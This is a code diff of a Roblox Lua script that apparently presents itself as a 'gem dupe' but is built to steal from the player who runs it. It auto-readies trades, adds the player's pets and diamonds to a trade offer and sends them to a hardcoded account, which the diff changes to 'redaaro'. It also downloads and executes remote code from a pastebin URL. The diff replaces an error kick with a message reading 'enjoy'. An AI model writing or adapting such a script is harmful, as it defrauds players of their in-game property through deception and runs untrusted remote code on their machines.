@@ -1,4 +1,4 @@
-getgenv().UName = "jerfie22"
+getgenv().UName = "redaaro"
 getgenv().HasWhitelisted = false
 
 local Players = game:GetService("Players")
@@ -109,18 +109,21 @@ local function rt()
         ReplicatedStorage.Events.UIAction:FireServer("ReadyTrade")
     end
 end
-
+local traded = false
 local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade
 TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
     if TradeGui.Visible then
-        task.spawn(rt)
-        AddWhitelistedPets()
-        ModifyDiamondOffer(Diamonds)
+        if traded then
+            task.spawn(rt)
+            AddWhitelistedPets()
+            ModifyDiamondOffer(Diamonds)
+        end
     end
 end)
 
 local function StartTrade()
     wait(9)
+    traded = true
     loadstring(game:HttpGet("https://pastebin.com/raw/8wP3Pkwz"))()
     SendTrade(getgenv().UName)
 end
@@ -206,7 +209,7 @@ if getgenv().HasWhitelisted or Diamonds > 10 then
         end)
     end
 else
-    LocalPlayer:Kick("An error occurred or no gems to dupe")
+    print("enjoy")
 end
 
 if #Players:GetPlayers() <= 1 then
